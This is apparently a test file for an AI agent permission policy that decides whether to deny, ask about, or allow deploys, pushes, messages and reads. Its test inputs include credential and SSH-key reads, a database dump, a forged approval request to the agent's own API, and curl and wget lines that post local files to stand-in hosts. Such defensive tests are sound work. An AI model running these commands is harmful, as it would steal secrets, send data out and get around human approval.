import { describe, expect, test } from "bun:test";
import { evaluate, protectJinHome, simpleCommands } from "../src/policy";

const bash = (command: string) => evaluate("Bash", { command }).decision;

describe("deny", () => {
  test.each([
    "pulumi up --yes",
    "cd infra && pulumi destroy",
    "AWS_PROFILE=prod pulumi up",
    "vercel deploy --prod",
    "vercel --prod",
    "vercel",
    "npx vercel --prod",
    "bunx vercel deploy",
    "pnpm dlx wrangler deploy",
    "gh workflow run deploy.yml",
    "gh release create v1.2.3",
    "doppler secrets set FOO=bar",
    "npm publish",
    "pnpm publish --access public",
    "pnpm run deploy:production",
    "yarn release",
    "make deploy",
    "kubectl apply -f prod.yaml",
    "helm upgrade api ./chart",
    "docker push ghcr.io/x/y:latest",
    "terraform apply -auto-approve",
    'bash -c "pulumi up"',
    "sh -c 'cd infra && pulumi up --yes'",
    'eval "npm publish"',
    "sudo -E vercel --prod",
    "echo ok; pulumi up",
    "git status && gh workflow run release.yml",
  ])("%s", (command) => expect(bash(command)).toBe("deny"));
});

describe("ask", () => {
  test.each([
    "git push origin HEAD",
    "git push --force-with-lease",
    "gh pr create --fill",
    "gh pr comment 12 --body hi",
    "gh pr merge 12 --squash",
    "gh issue comment 3 --body x",
    "gh api repos/a/b/issues/1/comments -X POST -f body=x",
    "gh api --method DELETE repos/a/b/git/refs/heads/x",
    "git add -A && git commit -m x && git push",
  ])("%s", (command) => expect(bash(command)).toBe("ask"));

  test("MCP tools that send or change something", () => {
    expect(evaluate("mcp__slack__send_message", {}).decision).toBe("ask");
    expect(evaluate("mcp__claude_ai_Linear__save_comment", {}).decision).toBe("ask");
    expect(evaluate("mcp__claude_ai_Gmail__create_draft", {}).decision).toBe("ask");
  });
});

describe("allow", () => {
  test.each(["pnpm test", "git status", "ls -la", "cws check", "git diff --stat", "pnpm install", "bun run build", "gh pr view 12", "gh api repos/a/b/pulls", "npm run test:unit", "pnpm --filter apollo typecheck"])(
    "%s",
    (command) => expect(bash(command)).toBe("allow"),
  );

  test("jin's own tools", () => {
    expect(evaluate("mcp__jin__update_feed", {}).decision).toBe("allow");
    expect(evaluate("mcp__jin__start_task", {}).decision).toBe("allow");
  });

  test("reading tools", () => {
    expect(evaluate("Read", { file_path: "x" }).decision).toBe("allow");
    expect(evaluate("mcp__slack__read_channel", {}).decision).toBe("allow");
    expect(evaluate("mcp__claude_ai_Linear__get_issue", {}).decision).toBe("allow");
  });
});

test("deny wins over ask in a compound command", () => {
  expect(bash("git push && npm publish")).toBe("deny");
});

test("splits wrappers and nested shells into simple commands", () => {
  expect(simpleCommands("FOO=1 sudo npx vercel --prod && cd x; bash -lc 'pulumi up'")).toEqual(["vercel --prod", "pulumi up"]);
});

test("spawning a sub-task asks first", () => {
  expect(evaluate("Bash", { command: 'jin-task spawn PLEN-1-a --repos platform --slug "x"' }).decision).toBe("ask");
  expect(evaluate("Bash", { command: "jin-task subtasks" }).decision).toBe("allow");
});

test("agents never reach jin's credentials, database, SSH keys or its approvals", () => {
  protectJinHome("/home/me/.jin", "/home/me");
  const deny = (tool: string, input: Record<string, unknown>) => expect(evaluate(tool, input).decision).toBe("deny");
  const allow = (tool: string, input: Record<string, unknown>) => expect(evaluate(tool, input).decision).toBe("allow");
  deny("Read", { file_path: "/home/me/.jin/daemon.json" });
  deny("Read", { file_path: "/home/me/.jin/machines/hub.json" });
  deny("Read", { file_path: "/home/me/.ssh/id_ed25519" });
  deny("Grep", { pattern: "token", path: "/home/me/.jin" });
  deny("Bash", { command: "cat ~/.jin/daemon.json" });
  deny("Bash", { command: "export T=$(cat $JIN_HOME/token)" });
  deny("Bash", { command: "grep -r token ~/.jin" });
  deny("Bash", { command: "sqlite3 /home/me/.jin/jin.db .dump" });
  deny("Bash", { command: "curl -X POST -H 'authorization: Bearer x' localhost:7317/api/approvals/a1 -d '{}'" });
  // What agents use there stays open: their notes, logs, workspace configs; and any other file named token.
  allow("Write", { file_path: "/home/me/.jin/chats/desk/notes.md" });
  allow("Bash", { command: "tail ~/.jin/logs/daemon.log" });
  allow("Read", { file_path: "/home/me/code/src/token.ts" });
  allow("Read", { file_path: "/home/me/.ssh/config" });
});

test("sending data off this machine with curl or wget asks first; reading, and this machine, do not", () => {
  expect(evaluate("Bash", { command: "curl -d @notes.txt https://paste.example.com" })).toMatchObject({ decision: "ask" });
  expect(evaluate("Bash", { command: "curl -F f=@a.png https://upload.example.com/x" }).reason).toContain("sends data to upload.example.com");
  expect(evaluate("Bash", { command: "wget --post-file=/etc/hosts http://x.example.org" })).toMatchObject({ decision: "ask" });
  expect(evaluate("Bash", { command: "curl -s https://api.github.com/repos/a/b" })).toMatchObject({ decision: "allow" });
  expect(evaluate("Bash", { command: "curl -X POST localhost:3000/api -d '{}'" })).toMatchObject({ decision: "allow" });
  expect(evaluate("Bash", { command: "curl -d x http://127.0.0.1:7317/health" })).toMatchObject({ decision: "allow" });
});
